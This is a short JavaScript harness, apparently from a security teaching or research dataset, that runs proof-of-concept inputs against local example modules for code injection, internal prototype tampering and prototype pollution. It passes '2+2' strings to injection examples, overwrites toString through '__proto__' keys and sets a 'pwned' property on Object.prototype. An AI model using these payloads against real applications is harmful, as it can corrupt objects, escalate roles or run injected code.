/**
 * PoC exploits for the example dataset
 */

// ================== Injection ==================
console.log("================== Injection ==================")

// ================== Example 0 ==================
var example0 = require("./injection/example-0");
console.log("Example 0:");
example0("2+2");

// ================== Example 1 ==================
var example1 = require("./injection/example-1");
console.log("Example 1:");
example1("2+2");

// ================== Example 2 ==================
var example2 = require("./injection/example-2");
console.log(`Example 2: ${example2("2+2")}`);

// ================== Example 3 ==================
var example3 = require("./injection/example-3");
console.log(`Example 3: ${example3("2+2")}`);

// ================== Example 4 ==================
var example4 = require("./injection/example-4");

console.log(`Example 4.1: ${example4("string")}`);

console.log(`Example 4.2: ${example4(10)}`);

console.log(`Example 4.3: ${example4(7 - 8)}`);

// ================== Example 5 ==================
var example5 = require("./injection/example-5");
console.log("Example 5:");
example5("2+2");

// ================== Example 6 ==================
var example6 = require("./injection/example-6");

console.log("Example 6:");
example6("2+2");

// ================== Example 7 ==================
var example7 = require("./injection/example-7");
console.log(`Example 7: ${example7("2+2")}`);

// ================== Internal Prototype Tampering ==================
console.log("======== Internal Prototype Tampering =========")

// ================== Example 0 ==================
// ================== Example 1 ==================
// ================== Example 2 ==================
example2 = require("./ipt/example-2");

console.log("Example 2.1:")
example2("role", "admin");

function newToString() {
    return "Hacked toString Implementation :)";
}

console.log("Example 2.2:")
example2("__proto__", { toString: newToString });

console.log("Example 2.3:")
example2("toString", newToString);

// ================== Prototype Pollution ==================
console.log("============ Prototype Pollution =============")

// ================== Example 0 ==================
example0 = require("./proto_pollution/example-0");

console.log("Example 0:");
console.log(`Prototype Polluted: ${{}.vulnerable0 === "pwned"}`);
example0("__proto__", "vulnerable0", "pwned");
console.log(`Prototype Polluted: ${{}.vulnerable0 === "pwned"}`);